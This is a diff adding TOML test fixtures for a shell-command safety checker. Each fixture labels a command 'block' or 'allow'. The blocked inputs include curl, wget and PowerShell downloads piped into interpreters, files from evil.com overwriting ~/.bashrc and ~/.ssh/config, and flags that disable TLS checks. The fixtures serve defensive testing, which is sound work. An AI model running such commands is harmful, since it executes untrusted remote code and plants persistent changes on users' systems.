@@ -1,0 +1,358 @@
+# Command shape fixtures
+
+[[fixture]]
+name = "curl_pipe_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_sh"
+min_milestone = 1
+input = "curl -sSL https://example.com/install.sh | sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "wget_pipe_bash"
+min_milestone = 1
+input = "wget -qO- https://example.com/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["wget_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_python"
+min_milestone = 1
+input = "curl https://example.com/script.py | python3"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_sudo_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | sudo bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_env_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | env bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_bin_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | /bin/bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_stderr_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh |& bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "pipe_to_node"
+min_milestone = 1
+input = "curl https://example.com/script.js | node"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "pipe_to_perl"
+min_milestone = 1
+input = "curl https://example.com/script.pl | perl"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "pipe_to_ruby"
+min_milestone = 1
+input = "curl https://example.com/script.rb | ruby"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "generic_pipe_to_bash"
+min_milestone = 1
+input = "cat /tmp/script.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "curl_save_to_file"
+min_milestone = 1
+input = "curl -o install.sh https://example.com/install.sh"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "curl_no_pipe"
+min_milestone = 1
+input = "curl https://example.com/api/data"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "dotfile_overwrite_bashrc"
+min_milestone = 1
+input = "curl https://evil.com/config > ~/.bashrc"
+context = "exec"
+expected_action = "block"
+expected_rules = ["dotfile_overwrite"]
+
+[[fixture]]
+name = "dotfile_overwrite_zshrc"
+min_milestone = 1
+input = "curl https://evil.com/config > ~/.zshrc"
+context = "exec"
+expected_action = "block"
+expected_rules = ["dotfile_overwrite"]
+
+[[fixture]]
+name = "dotfile_overwrite_append"
+min_milestone = 1
+input = "curl https://evil.com/config >> ~/.profile"
+context = "exec"
+expected_action = "block"
+expected_rules = ["dotfile_overwrite"]
+
+[[fixture]]
+name = "dotfile_home_var"
+min_milestone = 1
+input = "curl https://evil.com/config > $HOME/.bashrc"
+context = "exec"
+expected_action = "block"
+expected_rules = ["dotfile_overwrite"]
+
+[[fixture]]
+name = "redirect_to_dev_null"
+min_milestone = 1
+input = "curl https://example.com/data > /dev/null"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "powershell_iwr_iex"
+min_milestone = 1
+input = "iwr https://evil.com/script.ps1 | iex"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "powershell_mixed_case_iwr"
+min_milestone = 1
+input = "IWR https://evil.com/script.ps1 | IEX"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "powershell_invoke_full"
+min_milestone = 1
+input = "Invoke-WebRequest https://evil.com/script.ps1 | Invoke-Expression"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "insecure_flag_curl"
+min_milestone = 1
+input = "curl -k https://example.com/install.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["insecure_tls_flags"]
+
+[[fixture]]
+name = "insecure_flag_curl_long"
+min_milestone = 1
+input = "curl --insecure https://example.com/install.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["insecure_tls_flags"]
+
+[[fixture]]
+name = "wget_no_check_cert"
+min_milestone = 1
+input = "wget --no-check-certificate https://example.com/install.sh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["insecure_tls_flags"]
+
+[[fixture]]
+name = "curl_pipe_zsh"
+min_milestone = 1
+input = "curl https://example.com/install.sh | zsh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_dash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | dash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_pipe_ksh"
+min_milestone = 1
+input = "curl https://example.com/install.sh | ksh"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "pipe_to_php"
+min_milestone = 1
+input = "curl https://example.com/script.php | php"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "simple_pipe_not_interpreter"
+min_milestone = 1
+input = "ls | grep foo"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "pipe_chain_safe"
+min_milestone = 1
+input = "cat file | sort | uniq"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "echo_pipe_grep"
+min_milestone = 1
+input = "echo hello | grep hello"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "curl_pipe_tee_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh | tee /tmp/install.sh | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "double_pipe_and_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh && bash /tmp/install.sh"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "semicolon_then_bash"
+min_milestone = 1
+input = "curl -o /tmp/install.sh https://example.com/install.sh; bash /tmp/install.sh"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "heredoc_bash"
+min_milestone = 1
+input = "bash << 'EOF'\necho hello\nEOF"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "multiline_pipe"
+min_milestone = 1
+input = "curl https://example.com/data \\\n  | jq '.results'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "2_to_1_pipe_bash"
+min_milestone = 1
+input = "curl https://example.com/install.sh 2>&1 | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["curl_pipe_shell"]
+
+[[fixture]]
+name = "curl_sslv3"
+min_milestone = 1
+input = "curl https://example.com/api"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "powershell_irm_iex"
+min_milestone = 1
+input = "irm https://evil.com/script.ps1 | iex"
+context = "exec"
+shell = "powershell"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "powershell_safe_command"
+min_milestone = 1
+input = "Get-Process | Where-Object {$_.CPU -gt 100}"
+context = "exec"
+shell = "powershell"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "curl_with_quoted_pipe"
+min_milestone = 1
+input = "echo \"hello | world\" | bash"
+context = "exec"
+expected_action = "block"
+expected_rules = ["pipe_to_interpreter"]
+
+[[fixture]]
+name = "pipe_chain_with_url"
+min_milestone = 1
+input = "curl https://api.github.com/repos | jq '.name'"
+context = "exec"
+expected_action = "allow"
+expected_rules = []
+
+[[fixture]]
+name = "dotfile_ssh_config"
+min_milestone = 1
+input = "curl https://evil.com/config > ~/.ssh/config"
+context = "exec"
+expected_action = "block"
+expected_rules = ["dotfile_overwrite"]
